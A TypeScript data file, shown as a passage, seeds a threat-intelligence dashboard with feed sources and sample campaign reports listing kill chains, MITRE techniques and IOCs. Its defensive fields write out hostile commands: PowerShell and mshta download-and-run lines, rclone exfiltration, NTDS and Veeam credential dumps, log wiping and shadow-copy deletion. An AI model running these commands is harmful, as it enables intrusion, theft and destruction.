import { FeedSourceConfig, ThreatReport } from '../types/threat';
import { generateSecOpsQueries } from '../utils/threatLogic';

export const DEFAULT_FEED_SOURCES: FeedSourceConfig[] = [
  {
    id: 'thn',
    name: 'The Hacker News',
    url: 'https://feeds.feedburner.com/TheHackersNews',
    type: 'rss',
    enabled: true,
    lastCount: 5,
    status: 'synced',
  },
  {
    id: 'bleeping',
    name: 'BleepingComputer',
    url: 'https://www.bleepingcomputer.com/feed/',
    type: 'rss',
    enabled: true,
    lastCount: 5,
    status: 'synced',
  },
  {
    id: 'cisa-kev',
    name: 'CISA KEV Catalog',
    url: 'https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json',
    type: 'json',
    enabled: true,
    lastCount: 6,
    status: 'synced',
  },
  {
    id: 'darkreading',
    name: 'Dark Reading',
    url: 'https://www.darkreading.com/rss.xml',
    type: 'rss',
    enabled: true,
    lastCount: 3,
    status: 'synced',
  },
  {
    id: 'krebs',
    name: 'KrebsOnSecurity',
    url: 'https://krebsonsecurity.com/feed/',
    type: 'rss',
    enabled: true,
    lastCount: 2,
    status: 'synced',
  },
  {
    id: 'unit42',
    name: 'Unit 42',
    url: 'https://unit42.paloaltonetworks.com/feed/',
    type: 'rss',
    enabled: true,
    lastCount: 3,
    status: 'synced',
  },
  {
    id: 'mandiant',
    name: 'Mandiant Threat Intel',
    url: 'https://www.mandiant.com/resources/blog/rss.xml',
    type: 'rss',
    enabled: true,
    lastCount: 3,
    status: 'synced',
  },
  {
    id: 'crowdstrike',
    name: 'CrowdStrike Adversary Intel',
    url: 'https://www.crowdstrike.com/en-us/blog/feed',
    type: 'rss',
    enabled: true,
    lastCount: 3,
    status: 'synced',
  },
];

function buildReport(
  partial: Omit<ThreatReport, 'secops'> & { secops?: ThreatReport['secops'] }
): ThreatReport {
  return {
    ...partial,
    secops:
      partial.secops ||
      generateSecOpsQueries({
        id: partial.id,
        title: partial.title,
        severity: partial.severity,
        threatActor: partial.threatActor,
        malwareFamily: partial.malwareFamily,
        cveIds: partial.cveIds,
        mitreAttack: partial.mitreAttack,
        iocs: partial.iocs,
      }),
  };
}

export const BASELINE_THREATS: ThreatReport[] = [
  buildReport({
    id: 'ti-2026-001',
    title: 'Volt Typhoon KV-Botnet Edge Router Zero-Day & Living-off-the-Land Campaign (CVE-2026-21409)',
    summary:
      'State-sponsored Volt Typhoon operators exploit unauthenticated command injection in edge WAN routers across Energy, Telecom, and Critical Infrastructure networks using LOTL binaries.',
    executiveSummary:
      'Volt Typhoon (Bronze Silhouette) is actively exploiting CVE-2026-21409, a critical pre-authentication command injection flaw in enterprise SD-WAN and SOHO edge appliances. Upon gaining access, operators avoid dropping custom malware to disk on internal hosts—instead chaining native Windows administrative utilities (ntdsutil, netsh, wmic, and PowerShell) to harvest Active Directory credentials, configure covert port-forwarding proxies, and maintain multi-month persistence inside Critical Infrastructure, Energy, and Telecom environments.',
    source: 'CISA KEV',
    sourceUrl: 'https://www.cisa.gov/known-exploited-vulnerabilities-catalog',
    publishedAt: new Date(Date.now() - 1000 * 60 * 35).toISOString(), // 35 mins ago
    isLive: true,
    isNew: true,
    aiEnriched: true,
    severity: 'Critical',
    cvssScore: 9.8,
    cveIds: ['CVE-2026-21409', 'CVE-2025-39112'],
    threatActor: 'Volt Typhoon',
    threatType: 'APT Groups',
    malwareFamily: 'KV-Botnet',
    malwareCategory: 'Botnets',
    targetIndustries: ['Critical Infrastructure/Energy', 'Telecom', 'Government'],
    targetRegions: ['North America', 'APAC', 'Global'],
    killChain: [
      {
        stage: 'Initial Access',
        title: 'Unauthenticated SD-WAN Appliance Exploit (CVE-2026-21409)',
        description:
          'Sends crafted HTTP management frames to exposed WAN interfaces to execute root shell commands and enroll the router into the KV-Botnet proxy mesh.',
        commandOrArtifact: 'POST /cgi-bin/diagnostics_wan.cgi HTTP/1.1',
        mitreId: 'T1190',
      },
      {
        stage: 'Execution',
        title: 'Living-off-the-Land WMI & PowerShell Discovery',
        description:
          'Executes native wmic and PowerShell commands from compromised jump hosts to enumerate domain controllers and network topology.',
        commandOrArtifact:
          'wmic process call create "cmd.exe /c ntdsutil \\"ac i ntds\\" \\"ifm\\" \\"create full C:\\Windows\\Temp\\pro\\" q q"',
        mitreId: 'T1047',
      },
      {
        stage: 'Persistence',
        title: 'Netsh Portproxy Covert Relay Creation',
        description:
          'Configures persistent Windows netsh interface portproxy rules on internal servers to blend C2 traffic with legitimate RDP and SMB flows.',
        commandOrArtifact:
          'netsh interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=445 connectaddress=10.40.1.10',
        mitreId: 'T1090.001',
      },
      {
        stage: 'Privilege Escalation',
        title: 'Volume Shadow Copy & NTDS.dit Offline Extraction',
        description:
          'Creates shadow copies via vssadmin/ntdsutil to extract the Active Directory database offline and crack domain administrator NTLM hashes.',
        commandOrArtifact: 'vssadmin create shadow /for=C: > C:\\Windows\\Temp\\tmp.cab',
        mitreId: 'T1003.003',
      },
      {
        stage: 'Defense Evasion',
        title: 'Selective Event Log Deletion & Timestamp Stomping',
        description:
          'Clears Windows Security (Event ID 4624/4688) and System logs around authentication windows using wevtutil.',
        commandOrArtifact: 'wevtutil cl Security && wevtutil cl System',
        mitreId: 'T1070.001',
      },
      {
        stage: 'Lateral Movement',
        title: 'Pass-the-Hash via Valid Domain Admin Accounts',
        description:
          'Moves laterally into OT/SCADA engineering workstations using stolen privileged domain credentials.',
        commandOrArtifact: 'impacket-wmiexec Administrator@10.40.12.5',
        mitreId: 'T1078.002',
      },
      {
        stage: 'Exfiltration & Impact',
        title: 'Multi-Hop Encrypted Tunnel Exfiltration via KV-Botnet Nodes',
        description:
          'Exfiltrates network architecture diagrams, SCADA configuration schemas, and AD databases through compromised SOHO router hops.',
        commandOrArtifact: 'TLS 1.3 Tunnel -> 172.104.91.214:8443',
        mitreId: 'T1041',
      },
    ],
    mitreAttack: [
      {
        tactic: 'Initial Access',
        techniqueId: 'T1190',
        techniqueName: 'Exploit Public-Facing Application',
        description: 'Exploits CVE-2026-21409 on internet-facing SD-WAN appliances.',
      },
      {
        tactic: 'Execution',
        techniqueId: 'T1047',
        techniqueName: 'Windows Management Instrumentation',
        description: 'Uses WMI for remote command execution and AD discovery.',
      },
      {
        tactic: 'Credential Access',
        techniqueId: 'T1003.003',
        techniqueName: 'OS Credential Dumping: NTDS',
        description: 'Extracts ntds.dit via ntdsutil IFM media creation.',
      },
      {
        tactic: 'Command and Control',
        techniqueId: 'T1090.001',
        techniqueName: 'Proxy: Internal Proxy',
        description: 'Chains netsh portproxy rules across internal Windows servers.',
      },
      {
        tactic: 'Defense Evasion',
        techniqueId: 'T1078.002',
        techniqueName: 'Valid Accounts: Domain Accounts',
        description: 'Operates almost exclusively through compromised legitimate credentials.',
      },
    ],
    iocs: {
      hashes: [
        {
          algorithm: 'SHA-256',
          value: '8f4b2e91c7d3a054e16b9847c12d390fa88b123490ce71ab56d0219e84c710aa',
          fileName: 'kv_mips_stage2.elf',
        },
        {
          algorithm: 'SHA-1',
          value: '4a91c082f7e12d33b98104c5e77f2109ab34d891',
          fileName: 'wan_diag_helper.sh',
        },
        {
          algorithm: 'MD5',
          value: 'd91b448201fc8923ab0192fe7712ca90',
          fileName: 'pro_ntds_dump.cab',
        },
      ],
      network: [
        {
          type: 'IPv4',
          value: '172.104.91.214',
          context: 'KV-Botnet Tier-1 Relay Node',
          portOrProtocol: 'TCP/8443',
        },
        {
          type: 'IPv4',
          value: '45.77.182.19',
          context: 'Volt Typhoon Operational Management Server',
          portOrProtocol: 'TCP/443',
        },
        {
          type: 'Domain',
          value: 'wan-firmware-check-global.net',
          context: 'Router Implant Check-in Domain',
          portOrProtocol: 'DNS / HTTPS',
        },
        {
          type: 'URL',
          value: 'https://wan-firmware-check-global.net/v2/cfg/mips64.bin',
          context: 'Stage-2 Router Memory Implant URI',
          portOrProtocol: 'HTTPS',
        },
      ],
      hostArtifacts: [
        {
          type: 'Command Line',
          value: 'ntdsutil "ac i ntds" "ifm" "create full C:\\Windows\\Temp\\pro" q q',
          description: 'Offline Active Directory NTDS database dump via ntdsutil',
        },
        {
          type: 'Command Line',
          value: 'netsh interface portproxy add v4tov4 listenport=50100 connectport=445',
          description: 'Internal portproxy tunnel configuration for lateral pivoting',
        },
        {
          type: 'Registry Key',
          value: 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\\tcp',
          description: 'Registry artifact written when netsh portproxy rules are created',
        },
        {
          type: 'File Path',
          value: 'C:\\Windows\\Temp\\pro\\Active Directory\\ntds.dit',
          description: 'Staged Active Directory database prior to exfiltration',
        },
      ],
    },
  }),

  buildReport({
    id: 'ti-2026-002',
    title: 'LockBit 4.0 & RansomHub Dual-Extortion Wave Targeting BFSI & Healthcare VMware ESXi Hypervisors',
    summary:
      'Affiliates deploy cross-platform Rust/Go ESXi encryptors after exploiting Citrix/Ivanti VPN appliances and abusing Veeam backup service credentials.',
    executiveSummary:
      'A high-velocity campaign attributed to LockBit 4.0 and RansomHub affiliates is targeting Finance/BFSI and Healthcare enterprises across North America, Europe, and APAC. Operators gain initial access through unpatched VPN concentrators (CVE-2026-1088), dump credentials from Veeam Backup & Replication PostgreSQL databases, and pivot via SSH directly to VMware ESXi hypervisors to terminate running virtual machines via esxcli before encrypting datastore volumes.',
    source: 'The Hacker News',
    sourceUrl: 'https://thehackernews.com/',
    publishedAt: new Date(Date.now() - 1000 * 60 * 95).toISOString(), // 1.5 hours ago
    isLive: true,
    isNew: true,
    aiEnriched: true,
    severity: 'Critical',
    cvssScore: 9.6,
    cveIds: ['CVE-2026-1088', 'CVE-2025-22457'],
    threatActor: 'RansomHub & LockBit Affiliates',
    threatType: 'Zero-Day Exploits',
    malwareFamily: 'LockBit',
    malwareCategory: 'Ransomware',
    targetIndustries: ['Finance/BFSI', 'Healthcare', 'Manufacturing'],
    targetRegions: ['North America', 'Europe', 'APAC'],
    killChain: [
      {
        stage: 'Initial Access',
        title: 'VPN Concentrator Buffer Overflow Exploitation (CVE-2026-1088)',
        description:
          'Bypasses authentication on perimeter SSL-VPN gateways and hijacks active administrative sessions.',
        commandOrArtifact: 'POST /dana-na/auth/url_admin/welcome.cgi',
        mitreId: 'T1190',
      },
      {
        stage: 'Execution',
        title: 'PowerShell Cobalt Strike & Sliver Beacon Deployment',
        description:
          'Executes reflective DLL loader in memory to establish resilient command and control.',
        commandOrArtifact:
          'rundll32.exe C:\\ProgramData\\Comms\\netutils_sync.dll,DllRegisterServer',
        mitreId: 'T1218.011',
      },
      {
        stage: 'Persistence',
        title: 'AnyDesk / Atera RMM Silent Installation',
        description:
          'Installs legitimate Remote Monitoring and Management (RMM) software in unattended service mode as backup access.',
        commandOrArtifact: 'msiexec.exe /i C:\\Users\\Public\\setup_rmm.msi /qn',
        mitreId: 'T1219',
      },
      {
        stage: 'Privilege Escalation',
        title: 'Veeam Backup Credential Harvesting',
        description:
          'Queries local SQL/PostgreSQL instances on backup servers to extract stored ESXi root and Domain Admin credentials.',
        commandOrArtifact: 'psql.exe -U postgres -d VeeamBackup -c "SELECT * FROM Credentials"',
        mitreId: 'T1555',
      },
      {
        stage: 'Defense Evasion',
        title: 'BYOVD (Bring Your Own Vulnerable Driver) EDR Termination',
        description:
          'Drops a signed vulnerable kernel driver (poortry.sys) to terminate endpoint detection kernel callbacks.',
        commandOrArtifact: 'sc.exe create SysDrvCore binPath= "C:\\Windows\\Temp\\poortry.sys" type= kernel',
        mitreId: 'T1562.001',
      },
      {
        stage: 'Lateral Movement',
        title: 'SSH Pivot to VMware ESXi Management Plane',
        description:
          'Enables SSH on ESXi hosts via vCenter and transfers the ELF64 Rust encryptor to /tmp/.',
        commandOrArtifact: 'esxcli vm process list && esxcli vm process kill --type=force --world-id=ALL',
        mitreId: 'T1021.004',
      },
      {
        stage: 'Exfiltration & Impact',
        title: 'Rclone Mega/S3 Exfiltration & ESXi Datastore Encryption',
        description:
          'Exfiltrates sensitive financial & patient records using Rclone before encrypting .vmdk and .vmx files across all LUNs.',
        commandOrArtifact: 'rclone.exe copy "\\\\fileserver\\finance" remote:bucket-exfil --transfers 32',
        mitreId: 'T1486',
      },
    ],
    mitreAttack: [
      {
        tactic: 'Initial Access',
        techniqueId: 'T1190',
        techniqueName: 'Exploit Public-Facing Application',
        description: 'Exploits CVE-2026-1088 on enterprise VPN gateways.',
      },
      {
        tactic: 'Defense Evasion',
        techniqueId: 'T1562.001',
        techniqueName: 'Impair Defenses: Disable or Modify Tools',
        description: 'Uses BYOVD kernel driver to blind EDR sensors.',
      },
      {
        tactic: 'Command and Control',
        techniqueId: 'T1219',
        techniqueName: 'Remote Access Software',
        description: 'Abuses commercial RMM tools for persistent interactive access.',
      },
      {
        tactic: 'Exfiltration',
        techniqueId: 'T1567.002',
        techniqueName: 'Exfiltration Over Web Service: Exfiltration to Cloud Storage',
        description: 'Uses renamed rclone.exe binary to stream data to external S3 buckets.',
      },
      {
        tactic: 'Impact',
        techniqueId: 'T1486',
        techniqueName: 'Data Encrypted for Impact',
        description: 'Encrypts VMware ESXi VMFS datastores and Windows SMB shares.',
      },
    ],
    iocs: {
      hashes: [
        {
          algorithm: 'SHA-256',
          value: '3c90e1f8452a6b77d09142c8a3b55f190e842c11ab99402d67e12904fa18c321',
          fileName: 'lockbit4_esxi_linux_amd64.elf',
        },
        {
          algorithm: 'SHA-256',
          value: '9a11b208f4c5d7821e330a94bc81209fa771230c8421b90e5541a23f0981d44e',
          fileName: 'poortry.sys',
        },
        {
          algorithm: 'MD5',
          value: '7f8102c94a11b802e34910cd8821fa04',
          fileName: 'svchost_rclone.exe',
        },
      ],
      network: [
        {
          type: 'IPv4',
          value: '193.149.176.88',
          context: 'Cobalt Strike / Sliver HTTPS C2 Server',
          portOrProtocol: 'TCP/443',
        },
        {
          type: 'IPv4',
          value: '185.215.113.42',
          context: 'Rclone Exfiltration Endpoint',
          portOrProtocol: 'TCP/443',
        },
        {
          type: 'Domain',
          value: 'cdn-veeam-telemetry-sync.com',
          context: 'Stage-2 Beacon Domain',
          portOrProtocol: 'HTTPS',
        },
        {
          type: 'URL',
          value: 'https://cdn-veeam-telemetry-sync.com/static/esxi_crypt.bin',
          context: 'ESXi Encryptor Payload URL',
          portOrProtocol: 'HTTPS',
        },
      ],
      hostArtifacts: [
        {
          type: 'Command Line',
          value: 'vssadmin.exe delete shadows /all /quiet && wmic shadowcopy delete',
          description: 'Volume shadow copy deletion prior to encryption',
        },
        {
          type: 'Command Line',
          value: 'rclone.exe copy "\\\\10.0.0.12\\shares" mega:dump_bfsi --mega-user',
          description: 'Bulk data exfiltration via Rclone',
        },
        {
          type: 'File Path',
          value: 'C:\\Windows\\Temp\\poortry.sys',
          description: 'Malicious BYOVD kernel driver dropped to disk',
        },
        {
          type: 'Mutex',
          value: 'Global\\LB4_RANSOMHUB_SYNC_991A',
          description: 'Encryptor single-instance mutex',
        },
      ],
    },
  }),

  buildReport({
    id: 'ti-2026-003',
    title: 'Lumma Stealer & RedLine MaaS Campaign Abusing Fake CAPTCHA & ClickFix PowerShell Lures',
    summary:
      'Widespread info-stealer campaign tricks enterprise users into pasting malicious PowerShell via fake Cloudflare/browser verification overlays, harvesting session cookies and OAuth tokens.',
    executiveSummary:
      'Threat researchers at BleepingComputer and Unit 42 have tracked a surge in "ClickFix" social engineering attacks delivering Lumma Stealer, RedLine, and Vidar info-stealers across Technology/SaaS, Retail, and Finance sectors in APAC, Europe, and LATAM. Compromised websites and malvertising redirects prompt victims with a spoofed "Verify You Are Human" dialog that copies an obfuscated mshta.exe / PowerShell command into the Windows clipboard and instructs the user to press Win+R and Enter.',
    source: 'BleepingComputer',
    sourceUrl: 'https://www.bleepingcomputer.com/',
    publishedAt: new Date(Date.now() - 1000 * 60 * 210).toISOString(), // 3.5 hours ago
    isLive: true,
    isNew: false,
    aiEnriched: true,
    severity: 'High',
    cvssScore: 8.6,
    cveIds: ['CVE-2025-21333'],
    threatActor: 'Storm-1607 MaaS Affiliates',
    threatType: 'Phishing/BEC',
    malwareFamily: 'Lumma Stealer',
    malwareCategory: 'InfoStealers',
    targetIndustries: ['Technology/SaaS', 'Retail', 'Finance/BFSI'],
    targetRegions: ['APAC', 'Europe', 'LATAM', 'Global'],
    killChain: [
      {
        stage: 'Initial Access',
        title: 'ClickFix Fake Verification Clipboard Injection',
        description:
          'JavaScript navigator.clipboard.writeText() silently injects a malicious mshta/PowerShell one-liner when the user clicks "Verify".',
        commandOrArtifact: 'mshta.exe https://verify-human-cloudflare-check.cc/captcha.hta',
        mitreId: 'T1204.002',
      },
      {
        stage: 'Execution',
        title: 'MSHTA & PowerShell Fileless Loader Execution',
        description:
          'Executes embedded VBScript/PowerShell inside mshta.exe to retrieve AES-encrypted Lumma Stealer shellcode.',
        commandOrArtifact:
          'powershell.exe -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'https://verify-human-cloudflare-check.cc/l.ps1\')"',
        mitreId: 'T1218.005',
      },
      {
        stage: 'Persistence',
        title: 'Startup Folder LNK & Scheduled Task Creation',
        description:
          'Drops a disguised shortcut in the user Startup directory pointing to a legitimate signed binary that side-loads the stealer.',
        commandOrArtifact:
          'C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDriveSync.lnk',
        mitreId: 'T1547.001',
      },
      {
        stage: 'Privilege Escalation',
        title: 'COM Elevation Moniker UAC Bypass',
        description:
          'Uses CMSTP / ICMLuaUtil COM interface to elevate process privileges without triggering a UAC prompt.',
        commandOrArtifact: 'dllhost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}',
        mitreId: 'T1548.002',
      },
      {
        stage: 'Defense Evasion',
        title: 'Process Hollowing into RegAsm.exe / MSBuild.exe',
        description:
          'Hollows out a suspended legitimate .NET framework binary (RegAsm.exe) and maps Lumma Stealer into its virtual memory.',
        commandOrArtifact: 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegAsm.exe',
        mitreId: 'T1055.012',
      },
      {
        stage: 'Lateral Movement',
        title: 'Session Cookie & Cloud OAuth Token Replay',
        description:
          'Extracts Chromium App-Bound Encryption (ABE) cookies, AWS/Azure CLI tokens, and VPN profiles to hijack corporate SSO sessions.',
        commandOrArtifact: 'C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies',
        mitreId: 'T1539',
      },
      {
        stage: 'Exfiltration & Impact',
        title: 'Compressed ZIP Archive Exfiltration Over Telegram & HTTPS C2',
        description:
          'Packages stolen browser vaults, cryptocurrency wallets, and corporate credentials into an in-memory ZIP sent to C2.',
        commandOrArtifact: 'POST https://lumma-gate-panel99.su/api/gate',
        mitreId: 'T1041',
      },
    ],
    mitreAttack: [
      {
        tactic: 'Execution',
        techniqueId: 'T1204.002',
        techniqueName: 'User Execution: Malicious File / Paste',
        description: 'Tricks user into executing clipboard command via Windows Run dialog.',
      },
      {
        tactic: 'Defense Evasion',
        techniqueId: 'T1218.005',
        techniqueName: 'System Binary Proxy Execution: Mshta',
        description: 'Proxies execution of remote HTA payload via mshta.exe.',
      },
      {
        tactic: 'Defense Evasion',
        techniqueId: 'T1055.012',
        techniqueName: 'Process Injection: Process Hollowing',
        description: 'Injects Lumma Stealer into suspended RegAsm.exe process.',
      },
      {
        tactic: 'Credential Access',
        techniqueId: 'T1539',
        techniqueName: 'Steal Web Session Cookie',
        description: 'Bypasses Chrome App-Bound Encryption to steal active SSO cookies.',
      },
    ],
    iocs: {
      hashes: [
        {
          algorithm: 'SHA-256',
          value: '5e81a4092c11f8730b4291d8c6a002e91f8823c401a9283bd71e6509a23c4410',
          fileName: 'lumma_v5_build.exe',
        },
        {
          algorithm: 'SHA-1',
          value: '1c8902a45f11b7823e0914d6a8821c09e4123b99',
          fileName: 'captcha.hta',
        },
        {
          algorithm: 'MD5',
          value: 'a0912e4481bc72910d4451ef9012ab33',
          fileName: 'l.ps1',
        },
      ],
      network: [
        {
          type: 'IPv4',
          value: '104.21.64.119',
          context: 'ClickFix Lure Delivery Server',
          portOrProtocol: 'TCP/443',
        },
        {
          type: 'Domain',
          value: 'verify-human-cloudflare-check.cc',
          context: 'Fake CAPTCHA Initial Stage Host',
          portOrProtocol: 'HTTPS',
        },
        {
          type: 'Domain',
          value: 'lumma-gate-panel99.su',
          context: 'Lumma Stealer C2 Exfiltration Gate',
          portOrProtocol: 'HTTPS',
        },
        {
          type: 'URL',
          value: 'https://verify-human-cloudflare-check.cc/captcha.hta',
          context: 'Malicious HTA Payload URL',
          portOrProtocol: 'HTTPS',
        },
      ],
      hostArtifacts: [
        {
          type: 'Command Line',
          value: 'mshta.exe https://verify-human-cloudflare-check.cc/captcha.hta',
          description: 'Executed directly from Explorer.exe (Win+R Run dialog)',
        },
        {
          type: 'Registry Key',
          value: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU',
          description: 'Stores history of commands pasted into the Windows Run (Win+R) dialog',
        },
        {
          type: 'File Path',
          value: 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegAsm.exe',
          description: 'Target binary used for process hollowing making outbound C2 connections',
        },
        {
          type: 'Named Pipe',
          value: '\\\\.\\pipe\\chrome_abe_elevate_ipc',
          description: 'Named pipe abused during browser cookie decryption',
        },
      ],
    },
  }),

  buildReport({
    id: 'ti-2026-004',
    title: 'APT29 (Midnight Blizzard) OAuth Token & Entra ID Cross-Tenant Cloud Identity Intrusion',
    summary:
      'Russian state nexus threat actor compromises legacy test OAuth applications and performs password spray attacks to gain persistent cross-tenant mail and repository access.',
    executiveSummary:
      'Mandiant and Microsoft Threat Intelligence report sustained cloud identity intrusions by APT29 (Midnight Blizzard) targeting Government, Technology/SaaS, and Defense organizations in Europe, North America, and Middle East. The actor leverages residential proxy networks to perform low-and-slow password spraying against non-MFA legacy test tenants, then registers rogue multi-tenant OAuth applications granted high-privilege Microsoft Graph API permissions (RoleManagement.ReadWrite.Directory and Mail.ReadWrite).',
    source: 'Mandiant Threat Intel',
    sourceUrl: 'https://www.mandiant.com/resources/blog',
    publishedAt: new Date(Date.now() - 1000 * 60 * 60 * 14).toISOString(), // 14 hours ago
    isLive: false,
    aiEnriched: true,
    severity: 'Critical',
    cvssScore: 9.4,
    cveIds: ['CVE-2025-49011'],
    threatActor: 'APT29',
    threatType: 'Cloud/Identity Attacks',
    malwareFamily: 'GraphAPI-Backdoor',
    malwareCategory: 'RATs',
    targetIndustries: ['Government', 'Technology/SaaS', 'Telecom'],
    targetRegions: ['Europe', 'North America', 'Middle East'],
    killChain: [
      {
        stage: 'Initial Access',
        title: 'Residential Proxy Password Spray on Legacy Test Tenant',
        description:
          'Distributes authentication attempts across thousands of residential SOCKS5 exit nodes targeting dormant staging accounts.',
        commandOrArtifact: 'POST https://login.microsoftonline.com/common/oauth2/token',
        mitreId: 'T1110.003',
      },
      {
        stage: 'Execution',
        title: 'Azure CLI & AADInternals Script Execution',
        description:
          'Uses AADInternals and custom Python Graph API scripts to enumerate service principals and federated trusts.',
        commandOrArtifact: 'Invoke-AADIntReconAsInsider -Tenant "corp.onmicrosoft.com"',
        mitreId: 'T1059.009',
      },
      {
        stage: 'Persistence',
        title: 'Rogue OAuth Service Principal Credential Addition',
        description:
          'Adds a new client secret and X.509 certificate to an existing trusted OAuth enterprise application.',
        commandOrArtifact: 'POST https://graph.microsoft.com/v1.0/applications/{id}/addPassword',
        mitreId: 'T1098.001',
      },
      {
        stage: 'Privilege Escalation',
        title: 'AppRoleAssignment Grant for Directory & Mail ReadWrite',
        description:
          'Assigns Exchange.ManageAsApp and RoleManagement.ReadWrite.Directory permissions to the compromised service principal.',
        commandOrArtifact: 'POST https://graph.microsoft.com/v1.0/servicePrincipals/{id}/appRoleAssignments',
        mitreId: 'T1098.003',
      },
      {
        stage: 'Defense Evasion',
        title: 'Conditional Access Policy Exemption & Residential IP Rotation',
        description:
          'Routes all Graph API queries through rotating geo-matched residential proxies matching victim headquarters.',
        commandOrArtifact: 'User-Agent: Mozilla/5.0 (compatible; MSAL-Python/1.28.0)',
        mitreId: 'T1562.008',
      },
      {
        stage: 'Lateral Movement',
        title: 'Cross-Tenant Synchronization & Federated IdP Pivot',
        description:
          'Pivots from staging tenant into production corporate tenant via B2B cross-tenant access trust settings.',
        commandOrArtifact: 'PATCH https://graph.microsoft.com/v1.0/policies/crossTenantAccessPolicy',
        mitreId: 'T1550.001',
      },
      {
        stage: 'Exfiltration & Impact',
        title: 'Automated Graph API Executive Mailbox & Source Code Exfiltration',
        description:
          'Continuously queries /users/{id}/messages and SharePoint vaults for cybersecurity and diplomatic correspondence.',
        commandOrArtifact: 'GET https://graph.microsoft.com/v1.0/users/secops@corp.com/messages?$top=500',
        mitreId: 'T1114.002',
      },
    ],
    mitreAttack: [
      {
        tactic: 'Initial Access',
        techniqueId: 'T1110.003',
        techniqueName: 'Brute Force: Password Spraying',
        description: 'Low-velocity password spraying via residential proxy mesh.',
      },
      {
        tactic: 'Persistence',
        techniqueId: 'T1098.001',
        techniqueName: 'Account Manipulation: Additional Cloud Credentials',
        description: 'Injects rogue client secrets into trusted OAuth service principals.',
      },
      {
        tactic: 'Privilege Escalation',
        techniqueId: 'T1098.003',
        techniqueName: 'Account Manipulation: Additional Cloud Roles',
        description: 'Grants Global Administrator and Mail.ReadWrite Graph API roles.',
      },
      {
        tactic: 'Defense Evasion',
        techniqueId: 'T1550.001',
        techniqueName: 'Use Alternate Authentication Material: Application Access Token',
        description: 'Bypasses interactive MFA checks using OAuth bearer tokens.',
      },
      {
        tactic: 'Collection',
        techniqueId: 'T1114.002',
        techniqueName: 'Email Collection: Remote Email Collection',
        description: 'Harvests executive and security team mailboxes via MS Graph API.',
      },
    ],
    iocs: {
      hashes: [
        {
          algorithm: 'SHA-256',
          value: '1d77c8902a44e612b09384f712c90a8834b1209fe7612a409cb812390ef41a20',
          fileName: 'graph_harvester_worker.py',
        },
        {
          algorithm: 'MD5',
          value: 'e44190c82a117b9034f812c09a4412b8',
          fileName: 'oauth_cert_rogue.pfx',
        },
      ],
      network: [
        {
          type: 'IPv4',
          value: '194.36.191.74',
          context: 'APT29 OAuth Token Replay Exit Node',
          portOrProtocol: 'TCP/443',
        },
        {
          type: 'IPv4',
          value: '91.199.84.112',
          context: 'SOCKS5 Residential Proxy Aggregator',
          portOrProtocol: 'TCP/1080',
        },
        {
          type: 'Domain',
          value: 'login-msft-sso-federation.org',
          context: 'AiTM Token Capture Relay',
          portOrProtocol: 'HTTPS',
        },
        {
          type: 'URL',
          value: 'https://login-msft-sso-federation.org/oauth2/v2.0/authorize',
          context: 'Rogue OAuth Consent Grant Phishing URI',
          portOrProtocol: 'HTTPS',
        },
      ],
      hostArtifacts: [
        {
          type: 'Command Line',
          value: 'az ad app credential reset --id 00000003-0000-0000-c000-000000000000 --append',
          description: 'Appends new secret credential to existing Azure AD / Entra application',
        },
        {
          type: 'File Path',
          value: '/tmp/.msal_token_cache_apt29.json',
          description: 'Cached OAuth refresh and access tokens on operator staging host',
        },
      ],
    },
  }),

  buildReport({
    id: 'ti-2026-005',
    title: 'Lazarus Group & APT41 Polyglot Supply Chain Attack on PyPI / NPM CI/CD Pipelines',
    summary:
      'Trojanized developer packages in financial & crypto CI/CD build pipelines deploy cross-platform BeaverTail loader and InvisibleFerret RAT across macOS, Linux, and Windows.',
    executiveSummary:
      'Lazarus Group (TraderTraitor) and overlapping APT41 supply chain clusters have published typosquatted and hijacked packages on NPM and PyPI targeting Finance/BFSI, cryptocurrency exchanges, and SaaS engineering teams in APAC, North America, and Europe. During `npm install` or `pip install` inside GitHub Actions or developer laptops, preinstall hooks execute obfuscated Node.js/Python payloads (BeaverTail) that harvest `.env` secrets, Kubernetes kubeconfigs, and SSH keys before deploying the InvisibleFerret modular backdoor.',
    source: 'Unit 42',
    sourceUrl: 'https://unit42.paloaltonetworks.com/',
    publishedAt: new Date(Date.now() - 1000 * 60 * 60 * 52).toISOString(), // ~2 days ago
    isLive: false,
    aiEnriched: true,
    severity: 'Critical',
    cvssScore: 9.3,
    cveIds: ['CVE-2026-0419'],
    threatActor: 'Lazarus',
    threatType: 'Supply Chain Attacks',
    malwareFamily: 'InvisibleFerret',
    malwareCategory: 'Loaders',
    targetIndustries: ['Finance/BFSI', 'Technology/SaaS', 'Telecom'],
    targetRegions: ['APAC', 'North America', 'Europe', 'Global'],
    killChain: [
      {
        stage: 'Initial Access',
        title: 'Malicious NPM / PyPI Package Preinstall Hook Execution',
        description:
          'Developers or CI/CD runners install a trojanized dependency containing a hidden postinstall script.',
        commandOrArtifact: 'node ./scripts/preinstall-telemetry.js --silent',
        mitreId: 'T1195.001',
      },
      {
        stage: 'Execution',
        title: 'BeaverTail Loader & Embedded Python Portable Runtime',
        description:
          'Drops a standalone portable Python environment into ~/.npl/ to execute InvisibleFerret even on hosts without Python installed.',
        commandOrArtifact: '~/.npl/python3/bin/python3 ~/.npl/main.py -s 1224',
        mitreId: 'T1059.006',
      },
      {
        stage: 'Persistence',
        title: 'macOS LaunchAgent / Linux Cron / Windows Registry Persistence',
        description:
          'Writes a plist LaunchAgent on macOS or crontab entry on Linux build servers to maintain continuous C2 polling.',
        commandOrArtifact: '~/Library/LaunchAgents/com.apple.node.helper.plist',
        mitreId: 'T1543.001',
      },
      {
        stage: 'Privilege Escalation',
        title: 'CI/CD Runner OIDC Token & AWS IAM Role Assumption',
        description:
          'Extracts GitHub Actions ACTIONS_ID_TOKEN_REQUEST_URL to mint short-lived AWS/GCP production admin credentials.',
